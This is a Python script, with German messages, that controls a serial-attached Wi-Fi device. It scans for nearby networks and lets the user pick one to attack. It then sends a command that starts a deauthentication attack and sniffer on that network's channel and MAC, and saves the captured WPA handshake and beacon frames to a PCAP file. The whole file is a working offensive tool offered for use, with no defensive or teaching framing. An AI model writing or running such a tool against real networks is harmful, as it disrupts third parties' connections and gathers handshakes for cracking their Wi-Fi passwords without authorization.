import serial
import struct
import time
import sys
import threading
from collections import deque

PORT = 'COM34'  # PORT ANPASSEN
BAUD = 921600
FILENAME = "handshake_auto.pcap"

packet_queue = deque()
networks_list = {}
keep_running = True
capture_mode = False
scan_finished = False

def serial_reader(ser):
    global keep_running, capture_mode, scan_finished
    stream_buffer = b""
    
    while keep_running:
        try:
            if ser.in_waiting > 0:
                raw_bytes = ser.read(ser.in_waiting)
                
                if not capture_mode:
                    stream_buffer += raw_bytes
                    while b"\n" in stream_buffer:
                        line, stream_buffer = stream_buffer.split(b"\n", 1)
                        decoded_line = line.decode('utf-8', errors='ignore').strip()
                        
                        if decoded_line.startswith("NET:"):
                            p = decoded_line.replace("NET:", "").split("|")
                            if len(p) == 4:
                                net_id, ssid, ch, mac = p[0], p[1], p[2], p[3]
                                networks_list[int(net_id)] = {"ssid": ssid, "ch": ch, "mac": mac}
                                print(f"[{net_id}] SSID: {ssid} (Ch: {ch}, MAC: {mac})")
                        elif "SCAN_DONE" in decoded_line:
                            print("\n--- Scan abgeschlossen ---")
                            scan_finished = True
                else:
                    stream_buffer += raw_bytes
                    while len(stream_buffer) >= 2:
                        pkt_len = struct.unpack("<H", stream_buffer[:2])[0]
                        if len(stream_buffer) >= 2 + pkt_len:
                            packet_payload = stream_buffer[2:2+pkt_len]
                            packet_queue.append((time.time(), packet_payload))
                            stream_buffer = stream_buffer[2+pkt_len:]
                        else:
                            break
            else:
                time.sleep(0.001)
        except Exception:
            break

def run():
    global keep_running, capture_mode, scan_finished
    try:
        ser = serial.Serial(PORT, BAUD, timeout=0.1)
    except Exception as e:
        print(f"Fehler: COM-Port belegt oder falsch ({e})")
        return
        
    time.sleep(2)
    ser.reset_input_buffer()

    t = threading.Thread(target=serial_reader, args=(ser,))
    t.daemon = True
    t.start()

    print("Scanne Netzwerke... Bitte warten...")
    ser.write(b"SCAN\n")
    
    while not scan_finished:
        time.sleep(0.1)
        
    idx_input = input("\nWLAN Nummer eingeben zum Angreifen & Sniffen: ")
    try:
        idx = int(idx_input)
        selected_net = networks_list[idx]
    except (ValueError, KeyError):
        print("Ungültige Auswahl.")
        keep_running = False
        return

    target_ch = selected_net["ch"]
    target_mac = selected_net["mac"]
    
    print(f"\nStarte Sniffer und Deauther automatisch auf {selected_net['ssid']}...")
    capture_mode = True
    
    ser.write(f"START:{target_ch}:{target_mac}\n".encode())
    print("[!] Angriff läuft. Drücke 'Strg+C' um die PCAP-Datei abzuspeichern.\n")

    try:
        while True:
            sys.stdout.write(f"\rGefangene Handshake/Beacon Pakete im RAM-Buffer: {len(packet_queue)}")
            sys.stdout.flush()
            time.sleep(0.2)
    except KeyboardInterrupt:
        keep_running = False
        print("\n\nBeende Aufzeichnung und generiere PCAP...")
        
        if not packet_queue:
            print("Keine relevanten Pakete aufgezeichnet.")
            return

        with open(FILENAME, "wb") as f:
            f.write(struct.pack("<IHHIIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 105))
            written = 0
            while packet_queue:
                ts, pkt = packet_queue.popleft()
                sec = int(ts)
                usec = int((ts - sec) * 1000000)
                p_len = len(pkt)
                
                f.write(struct.pack("<IIII", sec, usec, p_len, p_len))
                f.write(pkt)
                written += 1
                
        print(f"Erfolgreich! {written} Pakete fehlerfrei in '{FILENAME}' gesichert.")

if __name__ == "__main__":
    run()
